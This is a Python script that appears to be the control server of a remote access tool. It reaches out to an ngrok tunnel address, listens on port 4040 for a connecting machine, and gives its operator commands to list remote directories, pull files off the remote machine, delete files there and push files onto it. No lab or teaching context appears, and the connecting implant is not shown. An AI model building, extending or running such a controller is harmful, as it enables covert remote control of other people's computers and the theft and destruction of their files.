import os
import socket
import urllib.request

URL = 'https://1b2c4e05.ngrok.io'

with urllib.request.urlopen(URL) as response:
	read = response.read()
	print('HTTP Server: >> ' + URL)

localhost = '127.0.0.1'

s = socket.socket()
socket.getaddrinfo('localhost', 4040)
hostname = socket.gethostname()
if (hostname == '127.0.0.1'):
    print("Server is running on " + localhost)
else:
    pass
port = 4040
s.bind((hostname,port))
print('')
print('server is running on @ ' + hostname)
print('')
print('waiting for local connections')
s.listen(1)
conn, addr = s.accept()
print(addr, ' has connected to the server successfully.')

# end of connection

# start of command handling

while 1:
    print('\n')
    command = input(str('command >> '))
    if command == 'view_cwd':
        conn.send(command.encode())
        print('')
        print('command sent, waiting for execution')
        print('')
        files = conn.recv(5000)
        files = files.decode()
        print('command output: ' + files)
        print('')

    elif command == "custom_dir":
        conn.send(command.encode())
        print('')
        user_input = input(str('custom dir: '))
        conn.send(user_input.encode())
        print('')
        print('command sent')
        print('')
        files = conn.recv(5000)
        files = files.decode()
        print('custom dir output: ' + files)

    elif command == "download_files":
        conn.send(command.encode())
        filepath = input(str('please enter the filepath including filename: >> '))
        conn.send(filepath.encode())
        file = conn.recv(10000)
        filename = input(str('please enter a filename for the incoming file (including . extension name): >> '))
        new_file = open(filename, 'wb')
        new_file.write(file)
        new_file.close()
        print('')
        print(filename, ' has been downloaded and saved')
        print('')

    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str('please enter the filename and directory: >> '))
        conn.send(fileanddir.encode())
        print('')
        print('command executed successfully: file removed.')

    elif command == "send_file":
        conn.send(command.encode())
        file = input(str('please enter filename and directory of file: >> '))
        filename = input(str('please enter the filename for file being sent: >> '))
        data = open(file, 'rb')
        file_data = data.read(7000) # change if sending file is large
        conn.send(filename.encode())
        print(file + ' sent.')
        conn.send(file_data)
    
    else:
        print('')
        print('command error (unrecognised)')
